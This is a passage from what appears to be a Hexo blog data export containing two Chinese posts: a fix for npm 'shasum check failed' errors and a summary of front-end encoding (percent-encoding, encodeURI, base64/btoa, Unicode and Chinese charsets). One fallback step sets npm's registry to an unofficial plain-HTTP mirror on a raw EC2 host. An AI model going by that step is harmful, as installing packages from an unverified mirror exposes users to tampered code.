rel=\"noopener\">这个链接的方案</a></p>\n<ol>\n<li><p>通过config命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set registry http://registry.cnpmjs.org </span><br><span class=\"line\">npm info underscore （如果上面配置正确这个命令会有字符串response）</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>命令行指定<br><code>npm --registry http://registry.cnpmjs.org</code> info underscore</p>\n</li>\n<li>编辑 ~/.npmrc 加入下面内容<br><code>registry = http://registry.cnpmjs.org</code><br>搜索镜像: <a href=\"http://cnpmjs.org\" target=\"_blank\" rel=\"noopener\">http://cnpmjs.org</a></li>\n</ol>\n<p>最后在starkoverflow的这个<a href=\"http://stackoverflow.com/questions/20633898/shasum-check-failed-error-while-installing-phonegap\" target=\"_blank\" rel=\"noopener\">链接</a>，试到了正解：</p>\n<h3 id=\"可行的方案\"><a href=\"#可行的方案\" class=\"headerlink\" title=\"可行的方案\"></a>可行的方案</h3><ol>\n<li>Try this first<br><code>npm set registry https://registry.npmjs.org/</code></li>\n<li>if failed then try to use the npm mirror:<br><code>npm set registry http://ec2-46-137-149-160.eu-west-1.compute.amazonaws.com</code></li>\n<li>then use it normally:<br><code>npm install express</code></li>\n</ol>\n<p>我只用了第一句就不再报错了，之前使用的cnpm.js，这个小叛徒，给我造成这么多err，还是原版、官方靠谱</p>\n","site":{"data":{}},"excerpt":"<p>使用npm install的时候，死活报错：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm ERR! shasum check failed for C:\\Users\\MARY~1.TIE\\AppData\\Local\\Temp\\npm-1212</span><br><span class=\"line\">-7fb4bd00\\registry.cnpmjs.org\\iconv-lite\\download\\iconv-lite-0.4.11.tgz</span><br></pre></td></tr></table></figure></p>","more":"<p>网上这个问题搜到挺多答案的，但是试了好多都不行，</p>\n<h3 id=\"现在列出我试过的-这些试过来都不行：\"><a href=\"#现在列出我试过的-这些试过来都不行：\" class=\"headerlink\" title=\"现在列出我试过的,这些试过来都不行：\"></a>现在列出我试过的,这些试过来都不行：</h3><p>来自<a href=\"http://www.ithao123.cn/content-41081.html\" target=\"_blank\" rel=\"noopener\">这个链接的方案</a></p>\n<ol>\n<li><p>通过config命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set registry http://registry.cnpmjs.org </span><br><span class=\"line\">npm info underscore （如果上面配置正确这个命令会有字符串response）</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>命令行指定<br><code>npm --registry http://registry.cnpmjs.org</code> info underscore</p>\n</li>\n<li>编辑 ~/.npmrc 加入下面内容<br><code>registry = http://registry.cnpmjs.org</code><br>搜索镜像: <a href=\"http://cnpmjs.org\" target=\"_blank\" rel=\"noopener\">http://cnpmjs.org</a></li>\n</ol>\n<p>最后在starkoverflow的这个<a href=\"http://stackoverflow.com/questions/20633898/shasum-check-failed-error-while-installing-phonegap\" target=\"_blank\" rel=\"noopener\">链接</a>，试到了正解：</p>\n<h3 id=\"可行的方案\"><a href=\"#可行的方案\" class=\"headerlink\" title=\"可行的方案\"></a>可行的方案</h3><ol>\n<li>Try this first<br><code>npm set registry https://registry.npmjs.org/</code></li>\n<li>if failed then try to use the npm mirror:<br><code>npm set registry http://ec2-46-137-149-160.eu-west-1.compute.amazonaws.com</code></li>\n<li>then use it normally:<br><code>npm install express</code></li>\n</ol>\n<p>我只用了第一句就不再报错了，之前使用的cnpm.js，这个小叛徒，给我造成这么多err，还是原版、官方靠谱</p>"},{"title":"前端中关于编码和转码的知识小总结","date":"2016-10-30T06:30:00.000Z","toc":true,"comments":1,"_content":"摘要：\n\n1. url编码%uxxxx\n2. base64\n3. unicode转义序列\\uxxxx\n4. 字符编码知识：ASCII,Unicode,Utf-8,GB2312,GBK\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/](http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/)\n \n# 一、前言 #\n自从学前端以来，关于编码和转码这一块的知识，不论是书还是博客，从来没有看到过作系统介绍的文章，自己也都是三不五时零碎地遇到这方面的问题，加上这块的知识也挺复杂琐碎的，所以一直都比较糊涂，于是在这个深圳刚刚降温，秋高气爽的下午，无比地需要写上这么一篇总结啦啦啦。总结来自于网上资料整理和自己的浅薄经验，比较肤浅，等我把肤浅的东西弄熟之后再添加深入的东西(ง •̀_•́ )ง\n\n# 二、url编码%uxxxx #\n\n1. %uxxxx是url编码的结果\n\n2. 为什么要进行URL编码?\n【文档标准】\nRFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。RFC3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。\nHTTP协议中通过URL传参是通过键值对形式进行的，格式上是以？、&和=为特征标识进行解析，如果键或者值的内容中包含这些符号，就会造成解析错误，所以要进行编码，用不会造成歧义的符号代替有歧义的符号。\n\n3. 编码方式：\n在特殊字符前加上%，例如“name1=value1”,其中value1的值是“va&lu=e1”，对其进行URL编码后：“name1=va%26lu%3D”，这样服务端会把紧跟在“%”后的字节当成普通的字节，就是不会把它当成各个参数或键值对的分隔符。因此，Url编码通常也被称为百分号编码\n\n4. 为什么汉字也要进行编码：URL中的传参字符串是ASCII编码而非unicode，所以URL中不能包含任何非ASCII字符，否则可能出问题。\n\n5. JS中的escape()和encodeURI()的区别：\nescape()是把非ASCII字符先进行unicode编码，然后把四位十六进制字符前面加%，这种方式已经被W3C废弃，而后个是把非ASCII字符先进行UTF-8编码，然后加百分号，这是RFC推荐的，所以现在对url编码都是使用encodeURI了。\nescape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如“春节”的返回结果是%u6625%u8282，也就是说在Unicode字符集中，“春”是第6625个（十六进制）字符，“节”是第8282个（十六进制）字符。\n\n6. encodeURI和encodeURIComponent的区别：\nencodeURI()对完整的URI编码，后者对URI的一个组件进行编码。这样分隔URI组件的那些特殊符号不会被encodeURI编码，但如果使用encodeURIComponent()，就会进行编码。需要注意的是，encodeURI不会对单引号进行编码\n\n7. 什么时候使用encodeURI()？四种涉及URL编码的场景，及该场景下的编码方式^1：\n    - 网址路径中包含汉字【UTF-8】\n    - 网址的查询字符串包含汉字【操作系统编码】\n    - Get方法生成的URL包含汉字，在已打开的网页上，直接用Get或Post方法发出HTTP请求，例form方式：【meta标签的charset属性定义的编码】\n    - Ajax调用的URL包含汉字:【不同浏览器的编码方式不同】\n对包含中文的URL的处理问题，不同浏览器表现不同，很混乱，保证客户端只用一种编码方法向服务器发出请求的解决方案：使用Javascript先对URL编码，然后再向服务器提交，不要给浏览器插手的机会。因为Javascript的输出总是一致的，所以就保证了服务器得到的数据是格式统一的。\n\n8. 出现乱码问题时的排查：\n    - 检查编辑器保存文件的字符集，和<meta>标签中指定的字符集是否一致\n    - 两次encodeURI后提交给后台，解决后台收到乱码的问题^5\n    - 服务器返回的响应头Content-Type没有指明字符编码\n\n9. win7操作系统默认编码是gbk，winXP是gb2312\n\n# 三、base64编码 #\n\n1. base64是什么？^6\nbase是二进制到文本字符串的转换方法，常用于在URL、Cookie、网页中传输少量二进制数据。\n\n2. 为什么要进行base64编码：\n用记事本打开pdf、exe、jpg等文件时，会显示乱码，因为二进制有许多不能显示的字符，如果想让记事本可以打开二进制文件，就需要把二进制转换成字符串，base64是常见的二进制转换方法。\n\n3. 什么时候进行base64编码：\n - 上传图片、文件时\n - 拼URL的时候，base64编码后，肉眼看不出信息\n\n4. 其他：\n - Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%，好处是编码后的文本数据可以在邮件正文、网页等直接显示。\n - Base64是一种通过查表的编码方法，不能用于加密，即使使用自定义的编码表也不行\n\n5. JS自带的base64转换方法：btoa()和atob()\n负责ASCII字符串或二进制数据与base64编码的相互转换。命名与实际作用相反：\n - btoa：按名字理解是base64到ASCII字符串或二进制数据呗，但实际作用是反过来。该方法不能直接作用于Unicode字符串，所以如果btoa('你好')，会报错。\n - atob：对base64码进行解码。\n - 如果要对中文进行base64编码，只需要将中文进行encodeURIComponent进行编码之后再进行 base64编码即可。\n\n# 四、\\unnnn是什么 #\n\\unnnn有两种含义：\n1. \\unnnn字符串的字符字面量，又叫转义序列，还包括\\ntbrf、\\\\、\\'、\\\"、\\xnn，nnnn是四位16进制数表示的unicode字符，\n2. 正则表达式元字符:\n```\nvar str = \"Visit W3Schools. Hello World!\";\nvar patt1 = /\\u0057/g;\nvar result = str.match(patt1);   //W,W\n```\n\n可以利用nnnn是unicode编码，和escape(),unescape()来进行编码和解码^7\n\n# 五、总结以上 #\n\n 1. URL中的传参字符串必须是ASCII编码\n 2. escape()：是把非ASCII字符先进行unicode编码，加%，已废弃。不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值\n 3. encodeURI：把非ASCII字符先进行UTF-8编码，然后加百分号，推荐！\n 4. btoa()和atob()负责ASCII字符串或二进制数据转换成一个base64，不能对unicode字符（如中文）使用，会报错\n\n# 六、字符编码知识总结 #\n\n1. 所有字符集源于ASCII字符集，是单字节字符集，最开始有128个，主要包括26个英文字符和数字，及其他符号和控制符^8\n2. ASCII字符集后来扩展到256个，主要是添加了其他一些符号\n3. 计算机传到亚洲，发展出多字节字符集。\n4. 中文字符集：\n\n - GB2312较常用，涵盖了所有简体字符以及一部分其他字符；\n - GBK(k是扩展的意思)，在GB2312的基础上添加了繁体字\n - GB18030 不是双字节字符集\n\n5. 更多ASCII衍生字符集出现后，世界各个组织进行标准化流程，ANSI组织提出ANSI标准字符编码，我们现在通常说到ANSI编码，通常指的是平台的默认编码，例如英文操作系统中是ISO-8859-1，中文系统是GBK。然后各个国家也都编写自己语言的字符集\n6. 新的需求出现了：**在一份文档中显示所有字符。**此时需要一个全人类达成共识的巨大的字符集，这就是 **Unicode字符集**，![sticker](http://o798x2hdw.bkt.clouddn.com/stickers/11.jpeg?imageView2/1/w/100/h/100/q/100)\n7. 在Unicode出现之前，所有的字符集都是和具体编码方案绑定在一起的，Unicode将字符集和字符编码方案分离开。所以产生了多种不同的Unicode编码集，**UTF-8是目前应用最广泛的一种Unicode编码方案**。中国的GB18030编码，覆盖了Unicode所有的字符，因此也算是一种Unicode编码。\n8. Unicode字符集只是定义了字符的集合和唯一编号，Unicode编码，则是对UTF-8、UCS-2/UTF-16等具体编码方案的统称而已，并不是具体的编码方案。所以当需要用到字符编码的时候，你可以写gb2312，codepage936，utf-8，utf-16，但请不要写unicode（看过别人在网页的meta标签里头写charset=unicode，有感而发）\n9. 造成 **乱码**的原因就是因为使用了错误的字符编码去解码字节流，因此当我们在思考任何跟文本显示有关的问题时，请时刻保持清醒：当前使用的字符编码是什么。\n10. **术语**：编码的过程是将字符转换成字节流。 解码的过程是将字节流解析为字符。\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/](http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/)\n\nReference：\n\n^1: [URL编码为什么中文加%原因](http://fengqing888.blog.163.com/blog/static/330114162013101522549676/)\n^2: [Unicode转义(\\uXXXX)的编码和解码](http://blog.csdn.net/java2009cgh/article/details/11214081)\n^3: [为什么要进行URL编码](http://www.cnblogs.com/jerrysion/p/5522673.html)\n^4: [encodeURI、encodeURIComponent、btoa及其应用场景](http://www.cnblogs.com/shytong/p/5102256.html)\n^5: [encodeURI来解决URL传递时的中文问题](http://www.cnblogs.com/jx270/p/4829589.html)\n^6: [base64](http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000)\n^7: [Unicode转义(\\uXXXX)的编码和解码](http://netwjx.github.io/blog/2012/07/07/encode-and-decode-unicode-escape-string/)\n^8: [关于字符编码，你所需要知道的（ASCII,Unicode,Utf-8,GB2312…）](http://www.imkevinyang.com/2010/06/%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84.html)\n\n\n\n\n","source":"_posts/knowledge-about-encoding-and-transcoding.md","raw":"---\ntitle: 前端中关于编码和转码的知识小总结\ndate: 2016-10-30 14:30:00\ncategories: Javascript\ntags: [编码,转码,总结] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n\n1. url编码%uxxxx\n2. base64\n3. unicode转义序列\\uxxxx\n4. 字符编码知识：ASCII,Unicode,Utf-8,GB2312,GBK\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/](http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/)\n \n# 一、前言 #\n自从学前端以来，关于编码和转码这一块的知识，不论是书还是博客，从来没有看到过作系统介绍的文章，自己也都是三不五时零碎地遇到这方面的问题，加上这块的知识也挺复杂琐碎的，所以一直都比较糊涂，于是在这个深圳刚刚降温，秋高气爽的下午，无比地需要写上这么一篇总结啦啦啦。总结来自于网上资料整理和自己的浅薄经验，比较肤浅，等我把肤浅的东西弄熟之后再添加深入的东西(ง •̀_•́ )ง\n\n# 二、url编码%uxxxx #\n\n1. %uxxxx是url编码的结果\n\n2. 为什么要进行URL编码?\n【文档标准】\nRFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。RFC3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。\nHTTP协议中通过URL传参是通过键值对形式进行的，格式上是以？、&和=为特征标识进行解析，如果键或者值的内容中包含这些符号，就会造成解析错误，所以要进行编码，用不会造成歧义的符号代替有歧义的符号。\n\n3. 编码方式：\n在特殊字符前加上%，例如“name1=value1”,其中value1的值是“va&lu=e1”，对其进行URL编码后：“name1=va%26lu%3D”，这样服务端会把紧跟在“%”后的字节当成普通的字节，就是不会把它当成各个参数或键值对的分隔符。因此，Url编码通常也被称为百分号编码\n\n4. 为什么汉字也要进行编码：URL中的传参字符串是ASCII编码而非unicode，所以URL中不能包含任何非ASCII字符，否则可能出问题。\n\n5. JS中的escape()和encodeURI()的区别：\nescape()是把非ASCII字符先进行unicode编码，然后把四位十六进制字符前面加%，这种方式已经被W3C废弃，而后个是把非ASCII字符先进行UTF-8编码，然后加百分号，这是RFC推荐的，所以现在对url编码都是使用encodeURI了。\nescape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如“春节”的返回结果是%u6625%u8282，也就是说在Unicode字符集中，“春”是第6625个（十六进制）字符，“节”是第8282个（十六进制）字符。\n\n6. encodeURI和encodeURIComponent的区别：\nencodeURI()对完整的URI编码，后者对URI的一个组件进行编码。这样分隔URI组件的那些特殊符号不会被encodeURI编码，但如果使用encodeURIComponent()，就会进行编码。需要注意的是，encodeURI不会对单引号进行编码\n\n7. 什么时候使用encodeURI()？四种涉及URL编码的场景，及该场景下的编码方式^1：\n    - 网址路径中包含汉字【UTF-8】\n    - 网址的查询字符串包含汉字【操作系统编码】\n    - Get方法生成的URL包含汉字，在已打开的网页上，直接用Get或Post方法发出HTTP请求，例form方式：【meta标签的charset属性定义的编码】\n    - Ajax调用的URL包含汉字:【不同浏览器的编码方式不同】\n对包含中文的URL的处理问题，不同浏览器表现不同，很混乱，保证客户端只用一种编码方法向服务器发出请求的解决方案：使用Javascript先对URL编码，然后再向服务器提交，不要给浏览器插手的机会。因为Javascript的输出总是一致的，所以就保证了服务器得到的数据是格式统一的。\n\n8. 出现乱码问题时的排查：\n    - 检查编辑器保存文件的字符集，和<meta>标签中指定的字符集是否一致\n    - 两次encodeURI后提交给后台，解决后台收到乱码的问题^5\n    - 服务器返回的响应头Content-Type没有指明字符编码\n\n9. win7操作系统默认编码是gbk，winXP是gb2312\n\n# 三、base64编码 #\n\n1. base64是什么？^6\nbase是二进制到文本字符串的转换方法，常用于在URL、Cookie、网页中传输少量二进制数据。\n\n2. 为什么要进行base64编码：\n用记事本打开pdf、exe、jpg等文件时，会显示乱码，因为二进制有许多不能显示的字符，如果想让记事本可以打开二进制文件，就需要把二进制转换成字符串，base64是常见的二进制转换方法。\n\n3. 什么时候进行base64编码：\n - 上传图片、文件时\n - 拼URL的时候，base64编码后，肉眼看不出信息\n\n4. 其他：\n - Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%，好处是编码后的文本数据可以在邮件正文、网页等直接显示。\n - Base64是一种通过查表的编码方法，不能用于加密，即使使用自定义的编码表也不行\n\n5. JS自带的base64转换方法：btoa()和atob()\n负责ASCII字符串或二进制数据与base64编码的相互转换。命名与实际作用相反：\n - btoa：按名字理解是base64到ASCII字符串或二进制数据呗，但实际作用是反过来。该方法不能直接作用于Unicode字符串，所以如果btoa('你好')，会报错。\n - atob：对base64码进行解码。\n - 如果要对中文进行base64编码，只需要将中文进行encodeURIComponent进行编码之后再进行 base64编码即可。\n\n# 四、\\unnnn是什么 #\n\\unnnn有两种含义：\n1. \\unnnn字符串的字符字面量，又叫转义序列，还包括\\ntbrf、\\\\、\\'、\\\"、\\xnn，nnnn是四位16进制数表示的unicode字符，\n2. 正则表达式元字符:\n```\nvar str = \"Visit W3Schools. Hello World!\";\nvar patt1 = /\\u0057/g;\nvar result = str.match(patt1);   //W,W\n```\n\n可以利用nnnn是unicode编码，和escape(),unescape()来进行编码和解码^7\n\n# 五、总结以上 #\n\n 1. URL中的传参字符串必须是ASCII编码\n 2. escape()：是把非ASCII字符先进行unicode编码，加%，已废弃。不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值\n 3. encodeURI：把非ASCII字符先进行UTF-8编码，然后加百分号，推荐！\n 4. btoa()和atob()负责ASCII字符串或二进制数据转换成一个base64，不能对unicode字符（如中文）使用，会报错\n\n# 六、字符编码知识总结 #\n\n1. 所有字符集源于ASCII字符集，是单字节字符集，最开始有128个，主要包括26个英文字符和数字，及其他符号和控制符^8\n2. ASCII字符集后来扩展到256个，主要是添加了其他一些符号\n3. 计算机传到亚洲，发展出多字节字符集。\n4. 中文字符集：\n\n - GB2312较常用，涵盖了所有简体字符以及一部分其他字符；\n - GBK(k是扩展的意思)，在GB2312的基础上添加了繁体字\n - GB18030 不是双字节字符集\n\n5. 更多ASCII衍生字符集出现后，世界各个组织进行标准化流程，ANSI组织提出ANSI标准字符编码，我们现在通常说到ANSI编码，通常指的是平台的默认编码，例如英文操作系统中是ISO-8859-1，中文系统是GBK。然后各个国家也都编写自己语言的字符集\n6. 新的需求出现了：**在一份文档中显示所有字符。**此时需要一个全人类达成共识的巨大的字符集，这就是 **Unicode字符集**，![sticker](http://o798x2hdw.bkt.clouddn.com/stickers/11.jpeg?imageView2/1/w/100/h/100/q/100)\n7. 在Unicode出现之前，所有的字符集都是和具体编码方案绑定在一起的，Unicode将字符集和字符编码方案分离开。所以产生了多种不同的Unicode编码集，**UTF-8是目前应用最广泛的一种Unicode编码方案**。中国的GB18030编码，覆盖了Unicode所有的字符，因此也算是一种Unicode编码。\n8. Unicode字符集只是定义了字符的集合和唯一编号，Unicode编码，则是对UTF-8、UCS-2/UTF-16等具体编码方案的统称而已，并不是具体的编码方案。所以当需要用到字符编码的时候，你可以写gb2312，codepage936，utf-8，utf-16，但请不要写unicode（看过别人在网页的meta标签里头写charset=unicode，有感而发）\n9. 造成 **乱码**的原因就是因为使用了错误的字符编码去解码字节流，因此当我们在思考任何跟文本显示有关的问题时，请时刻保持清醒：当前使用的字符编码是什么。\n10. **术语**：编码的过程是将字符转换成字节流。 解码的过程是将字节流解析为字符。\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/](http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/)\n\nReference：\n\n^1: [URL编码为什么中文加%原因](http://fengqing888.blog.163.com/blog/static/330114162013101522549676/)\n^2: [Unicode转义(\\uXXXX)的编码和解码](http://blog.csdn.net/java2009cgh/article/details/11214081)\n^3: [为什么要进行URL编码](http://www.cnblogs.com/jerrysion/p/5522673.html)\n^4: [encodeURI、encodeURIComponent、btoa及其应用场景](http://www.cnblogs.com/shytong/p/5102256.html)\n^5: [encodeURI来解决URL传递时的中文问题](http://www.cnblogs.com/jx270/p/4829589.html)\n^6: [base64](http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000)\n^7: [Unicode转义(\\uXXXX)的编码和解码](http://netwjx.github.io/blog/2012/07/07/encode-and-decode-unicode-escape-string/)\n^8: [关于字符编码，你所需要知道的（ASCII,Unicode,Utf-8,GB2312…）](http://www.imkevinyang.com/2010/06/%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84.html)\n\n\n\n\n","slug":"knowledge-about-encoding-and-transcoding","published":1,"updated":"2018-05-07T10:29:59.567Z","layout":"post","photos":[],"link":"","_id":"cjgw4449f00248d95brx6wh01","content":"<p>摘要：</p>\n<ol>\n<li>url编码%uxxxx</li>\n<li>base64</li>\n<li>unicode转义序列\\uxxxx</li>\n<li>字符编码知识：ASCII,Unicode,Utf-8,GB2312,GBK</li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/\">http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/</a></p>\n</blockquote>\n<h1 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h1><p>自从学前端以来，关于编码和转码这一块的知识，不论是书还是博客，从来没有看到过作系统介绍的文章，自己也都是三不五时零碎地遇到这方面的问题，加上这块的知识也挺复杂琐碎的，所以一直都比较糊涂，于是在这个深圳刚刚降温，秋高气爽的下午，无比地需要写上这么一篇总结啦啦啦。总结来自于网上资料整理和自己的浅薄经验，比较肤浅，等我把肤浅的东西弄熟之后再添加深入的东西(ง •̀_•́ )ง</p>\n<h1 id=\"二、url编码-uxxxx\"><a href=\"#二、url编码-uxxxx\" class=\"headerlink\" title=\"二、url编码%uxxxx\"></a>二、url编码%uxxxx</h1><ol>\n<li><p>%uxxxx是url编码的结果</p>\n</li>\n<li><p>为什么要进行URL编码?<br>【文档标准】<br>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。RFC3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。<br>HTTP协议中通过URL传参是通过键值对形式进行的，格式上是以？、&amp;和=为特征标识进行解析，如果键或者值的内容中包含这些符号，就会造成解析错误，所以要进行编码，用不会造成歧义的符号代替有歧义的符号。</p>\n</li>\n<li><p>编码方式：<br>在特殊字符前加上%，例如“name1=value1”,其中value1的值是“va&amp;lu=e1”，对其进行URL编码后：“name1=va%26lu%3D”，这样服务端会把紧跟在“%”后的字节当成普通的字节，就是不会把它当成各个参数或键值对的分隔符。因此，Url编码通常也被称为百分号编码</p>\n</li>\n<li><p>为什么汉字也要进行编码：URL中的传参字符串是ASCII编码而非unicode，所以URL中不能包含任何非ASCII字符，否则可能出问题。</p>\n</li>\n<li><p>JS中的escape()和encodeURI()的区别：<br>escape()是把非ASCII字符先进行unicode编码，然后把四位十六进制字符前面加%，这种方式已经被W3C废弃，而后个是把非ASCII字符先进行UTF-8编码，然后加百分号，这是RFC推荐的，所以现在对url编码都是使用encodeURI了。<br>escape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如“春节”的返回结果是%u6625%u8282，也就是说在Unicode字符集中，“春”是第6625个（十六进制）字符，“节”是第8282个（十六进制）字符。</p>\n</li>\n<li><p>encodeURI和encodeURIComponent的区别：<br>encodeURI()对完整的URI编码，后者对URI的一个组件进行编码。这样分隔URI组件的那些特殊符号不会被encodeURI编码，但如果使用encodeURIComponent()，就会进行编码。需要注意的是，encodeURI不会对单引号进行编码</p>\n</li>\n<li><p>什么时候使用encodeURI()？四种涉及URL编码的场景，及该场景下的编码方式^1：</p>\n<ul>\n<li>网址路径中包含汉字【UTF-8】</li>\n<li>网址的查询字符串包含汉字【操作系统编码】</li>\n<li>Get方法生成的URL包含汉字，在已打开的网页上，直接用Get或Post方法发出HTTP请求，例form方式：【meta标签的charset属性定义的编码】</li>\n<li>Ajax调用的URL包含汉字:【不同浏览器的编码方式不同】<br>对包含中文的URL的处理问题，不同浏览器表现不同，很混乱，保证客户端只用一种编码方法向服务器发出请求的解决方案：使用Javascript先对URL编码，然后再向服务器提交，不要给浏览器插手的机会。因为Javascript的输出总是一致的，所以就保证了服务器得到的数据是格式统一的。</li>\n</ul>\n</li>\n<li><p>出现乱码问题时的排查：</p>\n<ul>\n<li>检查编辑器保存文件的字符集，和<meta>标签中指定的字符集是否一致</li>\n<li>两次encodeURI后提交给后台，解决后台收到乱码的问题^5</li>\n<li>服务器返回的响应头Content-Type没有指明字符编码</li>\n</ul>\n</li>\n<li><p>win7操作系统默认编码是gbk，winXP是gb2312</p>\n</li>\n</ol>\n<h1 id=\"三、base64编码\"><a href=\"#三、base64编码\" class=\"headerlink\" title=\"三、base64编码\"></a>三、base64编码</h1><ol>\n<li><p>base64是什么？^6<br>base是二进制到文本字符串的转换方法，常用于在URL、Cookie、网页中传输少量二进制数据。</p>\n</li>\n<li><p>为什么要进行base64编码：<br>用记事本打开pdf、exe、jpg等文件时，会显示乱码，因为二进制有许多不能显示的字符，如果想让记事本可以打开二进制文件，就需要把二进制转换成字符串，base64是常见的二进制转换方法。</p>\n</li>\n<li><p>什么时候进行base64编码：</p>\n<ul>\n<li>上传图片、文件时</li>\n<li>拼URL的时候，base64编码后，肉眼看不出信息</li>\n</ul>\n</li>\n<li><p>其他：</p>\n<ul>\n<li>Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%，好处是编码后的文本数据可以在邮件正文、网页等直接显示。</li>\n<li>Base64是一种通过查表的编码方法，不能用于加密，即使使用自定义的编码表也不行</li>\n</ul>\n</li>\n<li><p>JS自带的base64转换方法：btoa()和atob()<br>负责ASCII字符串或二进制数据与base64编码的相互转换。命名与实际作用相反：</p>\n<ul>\n<li>btoa：按名字理解是base64到ASCII字符串或二进制数据呗，但实际作用是反过来。该方法不能直接作用于Unicode字符串，所以如果btoa(‘你好’)，会报错。</li>\n<li>atob：对base64码进行解码。</li>\n<li>如果要对中文进行base64编码，只需要将中文进行encodeURIComponent进行编码之后再进行 base64编码即可。</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"四、-unnnn是什么\"><a href=\"#四、-unnnn是什么\" class=\"headerlink\" title=\"四、\\unnnn是什么\"></a>四、\\unnnn是什么</h1><p>\\unnnn有两种含义：</p>\n<ol>\n<li>\\unnnn字符串的字符字面量，又叫转义序列，还包括\\ntbrf、\\、\\’、\\”、\\xnn，nnnn是四位16进制数表示的unicode字符，</li>\n<li>正则表达式元字符:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var str = &quot;Visit W3Schools. Hello World!&quot;;</span><br><span class=\"line\">var patt1 = /\\u0057/g;</span><br><span class=\"line\">var result = str.match(patt1);   //W,W</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>可以利用nnnn是unicode编码，和escape(),unescape()来进行编码和解码^7</p>\n<h1 id=\"五、总结以上\"><a href=\"#五、总结以上\" class=\"headerlink\" title=\"五、总结以上\"></a>五、总结以上</h1><ol>\n<li>URL中的传参字符串必须是ASCII编码</li>\n<li>escape()：是把非ASCII字符先进行unicode编码，加%，已废弃。不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值</li>\n<li>encodeURI：把非ASCII字符先进行UTF-8编码，然后加百分号，推荐！</li>\n<li>btoa()和atob()负责ASCII字符串或二进制数据转换成一个base64，不能对unicode字符（如中文）使用，会报错</li>\n</ol>\n<h1 id=\"六、字符编码知识总结\"><a href=\"#六、字符编码知识总结\" class=\"headerlink\" 